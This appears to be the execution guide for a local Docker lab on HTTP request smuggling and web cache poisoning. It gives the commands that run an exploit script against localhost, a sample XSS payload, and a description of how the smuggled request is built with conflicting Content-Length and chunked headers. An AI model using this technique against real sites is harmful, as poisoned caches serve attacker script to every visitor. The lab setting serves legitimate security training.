# Attack Execution

## Goal

Poison a cacheable resource so that requests for `/js/app.js` or a fresh variant of it return attacker-controlled HTML.

## Recommended Workflow

Use a fresh cache key. This is the most reliable method.

## 1. Start The Lab

```bash
docker compose up --build -d
docker compose ps
```

## 2. Optional Baseline Checks

These are safe:

```bash
curl -i http://localhost/
curl -i "http://localhost/reflect?q=hello"
```

Do not request `/js/app.js` before the attack if you want to poison the exact plain path.

## 3. Run The Exploit

Recommended:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path '/js/app.js?cb=demo1'
```

Custom payload:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path '/js/app.js?cb=demo2' \
  --payload "<script>alert('owned')</script>"
```

## 4. Verify The Poisoned Response

```bash
curl -i "http://localhost/js/app.js?cb=demo1"
```

Successful signs:

- `X-Cache: HIT`
- response body contains your payload
- content type/body no longer matches the legitimate JavaScript file

## 5. Exact `/js/app.js` Demonstration

If you specifically want to poison `/js/app.js`, first clear the cache layer:

```bash
docker compose restart cache-layer
```

Then run:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path /js/app.js
```

Verify:

```bash
curl -i http://localhost/js/app.js
```

## What The Script Does Internally

### Phase 1

The script sends a crafted `POST /reflect` request with:

- `Content-Length`
- `Transfer_Encoding: chunked`
- a smuggled `GET /reflect?q=<payload>` prefix after the chunk terminator

### Phase 2

The script sends a trigger request for the chosen target path on the same TCP connection.

### Phase 3

The script opens a new connection and requests the target path again to confirm whether the poisoned response is now cached.

## Common Failure Cases

### Cache was already warm

Symptom:

- script reports cache `HIT` but payload is absent

Fix:

```bash
docker compose restart cache-layer
```

or use:

```bash
python3 exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path '/js/app.js?cb=retry1'
```

### Environment got desynchronized mid-test

Reset all services:

```bash
docker compose restart frontend-proxy cache-layer backend-origin
```

### Need runtime visibility

```bash
docker compose logs -f frontend-proxy cache-layer backend-origin
```
